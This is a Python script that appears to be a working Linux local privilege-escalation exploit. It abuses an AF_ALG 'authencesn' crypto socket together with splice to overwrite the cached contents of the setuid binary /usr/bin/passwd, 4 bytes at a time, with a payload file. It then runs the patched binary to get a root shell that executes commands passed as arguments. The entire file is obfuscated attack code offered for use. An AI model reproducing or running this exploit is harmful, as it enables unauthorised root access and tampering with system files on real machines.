#!/usr/bin/env python3
import os as g, zlib, socket as s, sys

TARGET = "/usr/bin/passwd"

def d(x):
    return bytes.fromhex(x)

def c(f, t, chunk):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A" * 4 + chunk],
              [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
              32768)
    r, w = g.pipe()
    n = g.splice
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except Exception:
        pass

e = open("/tmp/payload.bin", "rb").read()
f = g.open(TARGET, 0)
i = 0
while i < len(e):
    c(f, i, e[i:i+4])
    i += 4
sys.stderr.write("patched %d bytes of %s\n" % (len(e), TARGET))

# Run the patched setuid binary; it pivots to a root /bin/sh reading stdin.
cmd = ""
for line in sys.argv[1:]:
    cmd += line + "\n"
cmd += "exit\n"
r, w = g.pipe()
pid = g.fork()
if pid == 0:
    g.dup2(r, 0)
    g.dup2(1, 1)
    g.dup2(2, 2)
    g.close(r); g.close(w)
    g.execv(TARGET, [TARGET])
    g._exit(127)
else:
    g.close(r)
    g.write(w, cmd.encode())
    g.close(w)
    g.waitpid(pid, 0)
